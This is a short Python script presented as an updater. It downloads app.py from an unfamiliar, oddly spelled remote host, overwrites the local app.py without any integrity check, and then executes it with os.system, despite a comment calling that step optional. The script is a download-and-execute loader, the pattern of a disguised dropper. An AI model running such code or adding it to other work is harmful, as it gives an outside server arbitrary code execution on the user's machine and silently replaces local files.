import os
import requests


def download_script(url, save_path):
    try:
        # Send a GET request to the specified URL
        response = requests.get(url)
        # Raises stored HTTPError if response status code is 4XX/5XX
        response.raise_for_status()
        # Save the content of the response to a file
        with open(save_path, 'wb') as file:
            file.write(response.content)
        print(f"Script downloaded successfully and saved to {save_path}")
    except requests.RequestException as e:
        print(f"Failed to download the script: {e}")


def main():
    # Define the URL of the script to be downloaded
    script_url = 'https://pdate.ceremeet.com/laberUpdate/app.py'
    # Define the save path (same location as the script to be updated)
    save_path = './app.py'

    # Ensure the save path directory exists
    os.makedirs(os.path.dirname(save_path), exist_ok=True)

    # Download and save the script
    download_script(script_url, save_path)

    # Optionally, run the new script
    os.system(f"python {save_path}")


if __name__ == "__main__":
    main()
